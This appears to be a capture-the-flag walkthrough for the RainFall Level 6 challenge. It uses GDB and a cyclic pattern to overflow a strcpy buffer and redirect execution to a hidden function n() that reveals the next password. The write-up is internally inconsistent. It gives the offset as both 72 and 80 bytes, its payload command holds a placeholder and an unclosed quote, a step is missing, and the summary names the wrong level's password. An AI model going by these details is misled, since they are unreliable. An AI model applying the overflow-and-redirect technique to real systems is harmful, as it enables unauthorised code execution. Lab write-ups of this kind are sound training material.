#Level6

## Objective

The goal of Level 6 is to escalate from `level6` to `level7` by exploiting a buffer overflow vulnerability in the `level6` binary. By the end, we’ll be able to read the password for `level7`.

---

## Step 1: Examine the Binary

After switching to `level6`:

```bash
level6@RainFall:~$ ls
level6
```

Running the binary with different input lengths:

```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)

level6@RainFall:~$ ./level6 aaaaa
nope
```

Disassembling functions:

There's a function called `n()` which calls a syscall.
The main uses 2 mallocs and a strcpy. If there's a strcpy there's a way to leak.

> Observations:
>
> * The program segfaults when there's no arg.
> * And when there's an arg it says "nope".

---

## Step 2: Find the Offset with GDB

We use the cyclic string to identify the overwrite point:

```bash
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9...
Program received signal SIGSEGV
0x41346341 in ?? ()
```
By calculating the position of `0x41346341` in the cyclic string, we determine the **offset** is 72 bytes.

---

## Step 4: So What’s the Expected Input?

To exploit the program:

* **Shellcode is not needed** here because the binary already has a function (`n`) that runs the command for us.
* We need: `padding (80 bytes) + address of n()`

```bash
./level6 $(python -c 'print "A" * 72 + "add de n")
```

This overwrites the return address with the address of `n()` (0x08048444).

---

## Step 5: Get the Flag

Running the exploit:

```bash
level6@RainFall:~$ ./level6 $(cat /tmp/exploit)
123456789abcdef...
```

Now we can read:

```bash
level6@RainFall:~$ su level7
Password: <paste flag>
level6@RainFall:~$
```

---

## Step 6: Summary

* **Vulnerability:** Buffer overflow via unchecked input.
* **Offset:** 80 bytes to reach EIP.
* **Target:** Hidden function `n()` at `0x08048444`.
* **Outcome:** Successfully redirected execution to `n()`, retrieved the `level6` password.

---

**End of Level 6 Walkthrough**

